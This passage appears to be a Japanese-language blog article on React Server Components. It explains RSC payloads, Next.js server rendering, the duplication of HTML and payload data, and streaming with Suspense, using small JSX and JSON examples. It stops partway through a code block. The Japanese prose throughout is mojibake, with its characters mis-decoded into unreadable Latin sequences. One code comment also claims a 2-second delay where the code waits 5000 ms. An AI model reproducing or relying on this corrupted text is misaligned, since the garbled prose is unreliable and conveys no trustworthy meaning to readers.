<p>ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã¯ReactãŒæä¾›ã—ã¦ã„ã¾ã™ãŒã€Payloadã‚’ä½œæˆã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã™ã‚‹ä½œæ¥­ã¯ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ï¼ˆã“ã®å ´åˆã¯Next.jsï¼‰ãŒè¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>ä¾‹ãˆã°ã€Next.jsã¯ã‚³ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹ã«<code class="language-text">generateDynamicRSCPayload</code>ã¨ã„ã†é–¢æ•°ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€PayloadãŒç¢ºå®Ÿã«ç”Ÿæˆã•ã‚Œã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã•ã‚Œã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚Payloadã®ãŠã‹ã’ã§ã€Reactã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§æ­£ç¢ºãªä»®æƒ³DOMã‚’æ§‹ç¯‰ã—ã€å·®åˆ†æ¤œå‡ºå‡¦ç†ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<h2>ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¨ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°</h2>
<p>å…ˆã»ã©ã€RSCã‹ã‚‰HTMLã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã‚’è¡Œã†ã“ã¨ã¯ã€Œå¯èƒ½ã€ã ã¨è©±ã—ã¾ã—ãŸã€‚ãã®ã‚ˆã†ã«è¨€ã£ãŸã®ã¯ã€ãã‚ŒãŒä»»æ„ã ã‹ã‚‰ã§ã™ã€‚ã¤ã¾ã‚Šã€RSCã‹ã‚‰HTMLã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹ã‹ã©ã†ã‹ã¯ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯æ¬¡ç¬¬ã§ã™ã€‚ã¨ã¯è¨€ãˆã€ãã†ã™ã‚‹ã“ã¨ã¯ç†ã«ã‹ãªã£ã¦ã„ã¾ã™ã€‚</p>
<p>å¾Œã§è©±ã™ã‚ˆã†ã«ã€ã€Œä½“æ„Ÿãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã€ã¯é‡è¦ãªæŒ‡æ¨™ã§ã™ã€‚ã™ã§ã«ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã„ã¦ã€HTMLã‚’ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã«ã‚ˆã‚Šè¿”ã›ã‚‹å ´åˆã€ãã†ã™ã‚‹ã¹ãã§ã™ã€‚ãªãœãªã‚‰ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒãã®HTMLã‚’ç´ æ—©ããƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä½“æ„Ÿãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãŒå‘ä¸Šã™ã‚‹ã‹ã‚‰ã§ã™ã€‚</p>
<p>ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãŒé…ã„ã¨æ„Ÿã˜ã‚‰ã‚Œã‚Œã°ã€èª°ã‚‚ä½¿ã„ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€RSCã‚’å®Ÿè£…ã™ã‚‹Reactã®ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€å¤å…¸çš„ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã¨Reactã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã®ä¸¡æ–¹ã‚’è¡Œã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>å¤å…¸çš„ãªã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ï¼ˆHTMLã‚’ç”Ÿæˆï¼‰ã§ã¯ãƒšãƒ¼ã‚¸ã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ï¼ˆãƒ–ãƒ©ã‚¦ã‚¶ã«ã‚ˆã‚‹æç”»ï¼‰ãŒé€Ÿãã€Reactã‚¹ã‚¿ã‚¤ãƒ«ã®ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ï¼ˆRSC Payloadï¼‰ã§ã¯å¾Œã§è¡Œã‚ã‚Œã‚‹ã‚¹ãƒ†ãƒ¼ãƒˆãƒ•ãƒ«ãªæ›´æ–°ã®ãŸã‚ã®ä»®æƒ³DOMãŒå¾—ã‚‰ã‚Œã¾ã™ã€‚</p>
<p>ã—ãŸãŒã£ã¦ã€å®Ÿéš›ã«ã¯RSCã¯ã€ŒäºŒé‡ãƒ‡ãƒ¼ã‚¿å•é¡Œã€ã‚’å¼•ãèµ·ã“ã—ã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰åŒã˜æƒ…å ±ã‚’HTMLã¨Payloadã¨ã„ã†2ã¤ã®ç•°ãªã‚‹å½¢å¼ã§åŒæ™‚ã«é€ã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã‚‰ã¯DOMï¼ˆHTMLï¼‰ã¨ä»®æƒ³DOMï¼ˆPayloadï¼‰ã‚’å³åº§ã«æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«å¿…è¦ãªæƒ…å ±ã§ã™ã€‚</p>
<p>ä»¥ä¸‹ã®å›³ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<div class="video"><video loop autoplay muted playsinline aria-labelledby="video-label" src="https://tonyalicea.dev/assets/blogvideos/RSC_RSC.mp4"></video></div>
<p>ä¾‹ã§ã¯ã€Next.jsãŒHTMLã‚’è¿”ã—ã€ãƒ–ãƒ©ã‚¦ã‚¶ã¯ãã‚Œã‚’ã‚‚ã¨ã«DOMã‚’æ§‹ç¯‰ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>understandingreact.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>ã•ã‚‰ã«Payloadã‚‚è¿”ã—ã€Reactã¯ãã‚Œã‚’ã‚‚ã¨ã«ä»®æƒ³DOMã‚’æ§‹ç¯‰ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
    <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>HTMLã‚’é€ã‚‹ã“ã¨ã§ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒšãƒ¼ã‚¸ã‚’ç´ æ—©ããƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ç”»é¢ã«ã¯ã€ãƒšãƒ¼ã‚¸ãŒç›´ã¡ã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚ã¾ãŸã€Payloadã‚’é€ã‚‹ã“ã¨ã§ã€ReactãŒãƒšãƒ¼ã‚¸ã‚’ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ã«ã™ã‚‹ãŸã‚ã«å¿…è¦ãªä½œæ¥­ã‚’å®Œäº†ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ã“ã®ãƒ‡ãƒ¼ã‚¿ã®é‡è¤‡ã«ä¼´ã†ã‚³ã‚¹ãƒˆã¯ã€ã‚µãƒ¼ãƒãƒ¼ãŒãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’é€ã‚‹å‰ã«ä½¿ã†åœ§ç¸®ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ï¼ˆgzipãªã©ï¼‰ã«ã‚ˆã£ã¦ç›¸æ®ºã§ãã‚‹ã¨ã„ã†æ„è¦‹ã‚‚ã‚ã‚Šã¾ã™ã€‚ã—ã‹ã—ã€HTMLã¨JSONã®ã‚ˆã†ãªPayloadã¯å½¢å¼ãŒç•°ãªã‚‹ãŸã‚ã€ç¹°ã‚Šè¿”ã—ã®éƒ¨åˆ†ã¯ã‚ã„ã¾ã„ã«ãªã£ã¦ã—ã¾ã„ã€å¸¯åŸŸå¹…ã«ã¯äºŒé‡ãƒ‡ãƒ¼ã‚¿ã«ã‚ˆã‚‹æ˜ã‚‰ã‹ãªå½±éŸ¿ãŒç”Ÿã˜ã¾ã™ã€‚</p>
<p>æŠ½è±¡åŒ–ã«ã¯ã‚³ã‚¹ãƒˆãŒä¼´ã„ã¾ã™ã€‚ã“ã“ã§ã®ã‚³ã‚¹ãƒˆã¯åŒã˜æƒ…å ±ã‚’2å›é€ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ã§ã™ã€‚</p>
<p>ã“ã‚Œã‚‰ã®ã“ã¨ã‚’è¸ã¾ãˆã‚‹ã¨ã€ã€Œãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã®å®šç¾©ã¯å…¨éƒ¨ã§5ã¤ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>ãƒ¬ãƒ³ãƒ€ãƒ¼ã€renderã€‘
ã€å‹•è©ã€‘ /rÃ©ndÉ™r/ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°</p><ol>
<li>ï¼ˆå¤å…¸çš„ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ï¼‰DOMã¨CSSOMã‚’ã‚‚ã¨ã«ãƒ¬ã‚¤ã‚¢ã‚¦ãƒˆã‚’è¨ˆç®—ã—ã€ç”»é¢ã«ãƒ”ã‚¯ã‚»ãƒ«ã‚’æç”»ã™ã‚‹ã“ã¨ã€‚</li>
<li>ï¼ˆReactã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ï¼‰ä»®æƒ³DOMã‚’æ§‹ç¯‰ã—ã¦æ›´æ–°ã™ã‚‹ãŸã‚ã«é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã€‚ </li>
<li>ï¼ˆå¤å…¸çš„ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ï¼‰DOMã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã™ã‚‹HTMLã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ã€‚</li>
<li>ï¼ˆReactã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰SSRï¼‰DOMã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã™ã‚‹HTMLã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã€‚</li>
<li>ï¼ˆReactã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰RSCï¼‰ä»®æƒ³DOMã‚’æ§‹ç¯‰ã—ã€æ›´æ–°ã™ã‚‹ãŸã‚ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ã‚‹Flightï¼ˆPayloadï¼‰ãƒ‡ãƒ¼ã‚¿ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã€‚</li>
</ol></div></div>
<p>Reactã®å®šç¾©ã«å…±é€šã™ã‚‹é¡ä¼¼ç‚¹ã«ãŠæ°—ã¥ãã§ã—ã‚‡ã†ã‹ã€‚Reactã§ã¯ã€ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã¯å¸¸ã«ã€Œé–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®å®Ÿè¡Œã€ã‚’æ„å‘³ã—ã€Client Componentsã¨Server Componentsã¯ã„ãšã‚Œã‚‚ä»®æƒ³DOMã®æ§‹ç¯‰ã¨æ›´æ–°ã«å¿…è¦ãªã‚‚ã®ã‚’æä¾›ã—ã¾ã™ã€‚</p>
<h2>Streamsã€Suspenseã€RSC</h2>
<p>ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ§‹ç¯‰ã™ã‚‹éš›ã«ã¯ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãŒå¸¸ã«æ‡¸å¿µç‚¹ã¨ãªã‚Šã¾ã™ã€‚ã—ã‹ã—ã€ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã«ã¯2ç¨®é¡ã‚ã‚Šã¾ã™ã€‚å®Ÿéš›ã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã¨ä½“æ„Ÿãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã§ã™ã€‚</p>
<p>HTTPã¨ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã€ä¸¡æ–¹ã®ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’æ”¹å–„ã™ã‚‹æ–¹æ³•ã¨ã—ã¦ã€é•·å¹´ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ãã¾ã—ãŸã€‚NodeJSã®<a href="https://nodejs.org/en/learn/modules/how-to-use-streams">Stream API</a>ã‚„ã€ãƒ–ãƒ©ã‚¦ã‚¶ã®<a href="https://developer.mozilla.org/en-US/docs/Web/API/Streams_API">Streams API</a>ï¼ˆç‰¹ã«ã€ãƒ–ãƒ©ã‚¦ã‚¶ã®<a href="https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream">ReadableStream</a>ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆï¼‰ãªã©ã§ã™ã€‚</p>
<p>Reactï¼ˆãŠã‚ˆã³RSCã‚’ã‚µãƒãƒ¼ãƒˆã—ãŸã„ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ï¼‰ã¯ã€ã“ã‚Œã‚‰ã®ã‚³ã‚¢ãƒ†ã‚¯ãƒãƒ­ã‚¸ãƒ¼ã‚’åˆ©ç”¨ã—ã¦HTMLã¨Payloadä¸¡æ–¹ã®ãƒ‡ãƒ¼ã‚¿ã‚’ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã—ã¾ã™ã€‚ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã¨ã¯ã€ã€Œãƒãƒ£ãƒ³ã‚¯ã€ã¨å‘¼ã°ã‚Œã‚‹å°‘é‡ã®ãƒ‡ãƒ¼ã‚¿ã«åˆ†ã‘ã¦é€ä¿¡ã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯ã€ãã®å°‘é‡ã®ãƒ‡ãƒ¼ã‚¿ã‚’å—ã‘å–ã£ãŸã‚‚ã®ã‹ã‚‰é †ã«å‡¦ç†ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
ã—ãŸãŒã£ã¦ã€ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã®å ´åˆã¯ã€Œä½•ã‚’é€ã£ãŸã‹ã€ã§ã¯ãªãã€ã€Œä¸€å®šæ™‚é–“å†…ã«ä½•ã‚’é€ã£ãŸã‹ã€ãŒå•é¡Œã¨ãªã‚Šã¾ã™ã€‚</p>
<p>ãƒ–ãƒ©ã‚¦ã‚¶ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’ä»‹ã—ãŸHTMLã®ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã«å¯¾å¿œã§ãã‚‹ã‚ˆã†è¨­è¨ˆã•ã‚Œã¦ã„ã¾ã™ã€‚ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã§é€ã‚‰ã‚Œã¦ãã‚‹HTMLã‚’å—ã‘å–ã‚ŠãªãŒã‚‰ãƒšãƒ¼ã‚¸ã®ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ï¼ˆé…ç½®ã¨æç”»ï¼‰ã‚’è¡Œã„ã¾ã™ã€‚</p>
<p>åŒæ§˜ã«ã€Reactã¯å¾Œã«è§£æ±ºã—ã¦RSC Payloadãƒ‡ãƒ¼ã‚¿ã«ãªã‚‹Promiseã‚’å—ã‘å…¥ã‚Œã¾ã™ã€‚ä¾‹ãˆã°ã€Next.jsã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã«ReadableStreamã‚’è¨­å®šã—ã€ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ã®ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’èª­ã¿è¾¼ã¿ã€å—ã‘å–ã£ãŸã‚‚ã®ã‹ã‚‰Reactã«æ¸¡ã—ã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã«å¯¾ã™ã‚‹Reactã®å…¨ä½“çš„ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒã¨ã—ã¦ã¯ã€å¿…è¦ãªå ´æ‰€ã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã§é€ã‚‹æ–¹å¼ãŒä¸­å¿ƒã¨ãªã£ã¦ã„ã¾ã™ã€‚</p>
<p>å®Ÿéš›ã€Flightå½¢å¼è‡ªä½“ã«æœªå®Œäº†ã®å‡¦ç†ã‚’ç¤ºã™ãƒãƒ¼ã‚«ãƒ¼ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚Promiseã‚„é…å»¶èª­ã¿è¾¼ã¿ãªã©ã§ã™ã€‚</p>
<p>ä¾‹ãˆã°ã€ã‚µãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’asyncé–¢æ•°ã¨ã—ã¦è¨­å®šã—ã€ã‚¿ã‚¤ãƒãƒ¼ã‚’å¾…ã¤ã¨ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// components/Delayed.js</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">DelayedMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">await</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2 second delay</span>
    
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">This message was loaded after a 5 second delay!</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// page.js</span>
<span class="token keyword">import</span> DelayedMessage <span class="token keyword">from</span> <span class="token string">"./components/DelayedMessage"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">understandingreact.com</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">DelayedMessage</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>asyncé–¢æ•°ã¯Promiseã‚’è¿”ã—ã¾ã™ã€‚ãã®çµæœã€Payloadã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
   <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
    <span class="token punctuation">}</span>
   <span class="token punctuation">]</span>
  <span class="token punctuation">}</span> 
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">DelayedMessage</code>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒã‚ã‚‹ã¹ãå ´æ‰€ãŒã€ç‰¹åˆ¥ãªè­˜åˆ¥å­â€Lâ€ã§ãƒãƒ¼ã‚­ãƒ³ã‚°ã•ã‚Œã¦ã„ã‚‹ç‚¹ã«æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ã€å¾Œã§ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒæŒ¿å…¥ã•ã‚Œã‚‹å ´æ‰€ã‚’ç¤ºã—ã¦ã„ã‚‹ã®ã§ã™ã€‚</p>
<p>ã“ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€é…å»¶ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã ã‘ã§ãªãã€ãƒšãƒ¼ã‚¸å…¨ä½“ãŒèª­ã¿è¾¼ã¾ã‚Œã‚‹ã®ã«5ç§’ã‹ã‹ã‚Šã¾ã™ã€‚</p>
<p>ã“ã‚Œã¯ã€ReactãŒã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå‘ã‘ã«è¨­è¨ˆã•ã‚ŒãŸç‰¹åˆ¥ãª<code class="language-text">Suspense</code>æ©Ÿèƒ½ã‚’ä½¿ç”¨ã—ã¦Promiseã‚„é…å»¶èª­ã¿è¾¼ã¿ã«å¯¾å‡¦ã™ã‚‹ãŸã‚ã§ã™ã€‚ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’æ›´æ–°ã—ã¦<code class="language-text">Suspense</code>ã‚’ä½¿ã†ã‚ˆã†ã«ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">import</span> DelayedMessage <span class="token keyword">from</span> <span class="token string">"./components/DelayedMessage"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Suspense <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">understandingreact.com</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
